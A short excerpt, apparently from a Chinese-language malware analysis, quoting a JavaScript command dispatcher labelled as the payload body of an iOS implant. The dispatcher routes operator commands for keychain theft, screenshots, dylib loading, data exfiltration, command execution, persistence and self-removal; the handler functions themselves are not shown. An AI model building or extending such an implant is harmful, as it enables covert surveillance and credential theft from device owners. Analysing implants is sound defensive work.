`05-ios/coruna/implant_ops.js:506-540`（**载荷本体**）：

```js
async function handleCommand(cmd) {
    if (!cmd || !cmd.cmd) return { ok: false, error: 'empty_command' };
    var args = cmd.args || {};
    switch (cmd.cmd) {
        case 'keychain':    result = await runKeychain(args); break;      // :511
        case 'screenshot':  result = await runScreenshot(args); break;     // :514
        case 'dylib_load':  result = await runDylibLoad(args); break;      // :517
        case 'exfil':       result = await runExfil(args); break;          // :520
        case 'exec':        result = await runExec(args); break;           // :523
        case 'persist':     result = await runPersist(args); break;        // :526
        case 'sleep':       result = await runSleep(args); break;          // :529
        case 'hook_check':  result = await runHookCheck(args); break;      // :532
        case 'uninstall':   result = await runUninstall(args); break;      // :535
        default: result = { ok: false, status: 'unsupported', cmd: cmd.cmd };
    }
    return result;
}
```
